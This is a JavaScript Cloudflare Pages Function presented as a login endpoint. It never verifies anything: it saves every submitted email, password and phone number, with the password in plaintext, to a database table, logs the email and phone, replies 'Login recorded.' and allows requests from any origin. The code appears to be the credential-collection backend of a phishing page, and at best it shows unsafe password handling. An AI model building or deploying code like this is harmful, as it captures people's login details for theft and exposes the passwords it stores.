// Cloudflare Pages Function — replaces Python /api/login endpoint
// Uses Cloudflare D1 if bound, otherwise stores in memory log

export async function onRequestPost(context) {
  try {
    const body = await context.request.json();
    const { email = "", password = "", phone = "" } = body;

    if (!email && !phone) {
      return Response.json({ status: "error", message: "Missing credentials" },
        { status: 400, headers: corsHeaders() });
    }

    // Log to console (visible in Cloudflare dashboard)
    console.log(`[LOGIN] email=${email} phone=${phone} time=${new Date().toISOString()}`);

    // If Cloudflare D1 database is bound, save to it
    if (context.env && context.env.DB) {
      await context.env.DB.prepare(
        "INSERT INTO users (email, password, phone) VALUES (?, ?, ?)"
      ).bind(email, password, phone).run();
    }

    return Response.json(
      { status: "success", message: "Login recorded." },
      { headers: corsHeaders() }
    );

  } catch (e) {
    return Response.json({ status: "error" }, { status: 500, headers: corsHeaders() });
  }
}

export async function onRequestOptions() {
  return new Response(null, { status: 204, headers: corsHeaders() });
}

function corsHeaders() {
  return {
    "Access-Control-Allow-Origin":  "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Content-Type": "application/json"
  };
}
